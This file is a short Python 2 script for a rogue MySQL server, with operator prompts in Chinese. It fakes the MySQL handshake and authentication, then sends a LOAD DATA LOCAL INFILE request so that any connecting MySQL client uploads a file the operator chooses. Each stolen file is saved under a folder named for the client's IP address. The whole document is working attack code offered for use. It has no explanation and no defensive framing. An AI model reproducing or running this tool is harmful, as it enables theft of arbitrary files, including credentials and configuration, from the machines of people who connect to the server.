# -*- coding: utf-8 -*-
import socket
import os
import sys

#--------------------------------------------------------------------------------------------------------------------
port = int(sys.argv[1])
#--------------------------------------------------------------------------------------------------------------------

def mysql_get_file_content(sv, filename):
    conn, address = sv.accept()
    logpath = os.path.abspath('.') + "/log/" + address[0]
    if not os.path.exists(logpath):
        os.makedirs(logpath)
    # Conn from address)
    conn.sendall(
        "\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
    conn.recv(9999)
    # auth okay
    conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
    conn.recv(9999)
    # want file...
    wantfile = chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
    conn.sendall(wantfile)
    content = conn.recv(9999)
    conn.close()

    if len(content) > 4:
        with open(logpath + "/" + filename.replace("/", "_").replace(":", "_"), "w") as txt:
            txt.write(content)
        return True
    else:
        return False



# 开始监听
sv = socket.socket()
sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sv.bind(("", port))
sv.listen(5)
print "Listen Begin in port "+str(port)

# 日志文件夹




# 循环监听
while True:
    filename = raw_input("请输入接下来你想读的文件名 (直接按回车退出): ")
    if filename == "":
        break
    res = mysql_get_file_content(sv, filename)
    if res:
        print "Read Success! ---> "+filename
    else:
        print "Not Found~ ---> "+filename


